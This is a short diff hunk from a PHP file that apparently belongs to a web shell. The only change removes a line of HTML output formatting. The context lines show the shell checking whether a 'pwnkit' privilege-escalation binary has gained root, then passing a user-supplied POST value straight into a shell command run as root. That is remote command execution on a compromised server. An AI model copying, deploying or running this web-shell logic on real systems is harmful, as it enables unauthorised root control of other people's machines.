@@ -2508,7 +2508,6 @@ if ($_GET['don'] == true) {
                     if (isset($r_text[0]) && $r_text[0] === "uid=0(root)") {
                         echo "[+] Pwnkit: Root access success\n";
                         if (isset($_POST['submit-root'])) {
-                            echo "<pre class='text-white bg-black p-2 rounded mt-2'>";
                             echo htmlspecialchars(cmd('./pwnkit "' . $_POST['root-terminal'] . ' 2>&1"'));
                         }
                     } else {
